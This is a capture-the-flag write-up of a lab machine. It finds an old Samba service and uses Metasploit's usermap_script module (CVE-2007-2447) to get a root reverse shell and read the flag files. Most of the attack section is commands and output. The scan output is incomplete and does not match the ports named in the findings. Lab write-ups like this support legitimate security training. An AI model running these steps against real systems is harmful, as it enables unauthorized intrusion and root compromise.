```bash

```

**Results:**

```
PORT    STATE SERVICE     VERSION

139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
```

**Interesting findings:**
- FTP on port 21 — anonymous login enabled, worth checking even if it ends up being a dead end
- Samba 3.0.20 on 445 — immediately suspicious, that's an old version and rings a bell for a known RCE

## Attack Plan

### Option A: exploit/multi/handler ✗

**Why you tried it:** Got confused in Metasploit, picked the wrong module to start with.

1. Tried this:
```bash
use exploit/multi/handler
set RHOSTS 10.10.10.3
set LHOST <tun0 IP>
run
```
Result:
```
# Nothing. Just sat there. Not the right module at all.
```

**Why it failed:** `multi/handler` is for catching incoming shells, not for triggering the exploit. Wrong tool for this job. Should have gone straight to the Samba-specific module.

---

### Option B: exploit/multi/samba/usermap_script ✓

**Why this worked:** CVE-2007-2447 is a command injection vulnerability in the Samba `username map script` configuration option. When you send a specially crafted username containing shell metacharacters, Samba executes it. Metasploit has a clean module for this and it works reliably against 3.0.20.

1. Fire up Metasploit and load the module:
```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LHOST <tun0 IP>
run
```
Result:
```
[*] Started reverse TCP handler on <tun0 IP>:4444
[*] Command shell session 1 opened
```

2. Shell looked completely blank at this point — thought it had died. Just type a command anyway:
```bash
id
```
Result:
```
uid=0(root) gid=0(root)
```

Root. Straight away. No privesc needed.

## Post Exploitation / Privilege Escalation

No privesc required — landed directly as root off the back of the Samba exploit.

1. Grab the flags:
```bash
find / -name user.txt -o -name root.txt 2>/dev/null
```

```bash
cat /home/makis/user.txt
cat /root/root.txt
```

Result: `root shell — both flags in hand`
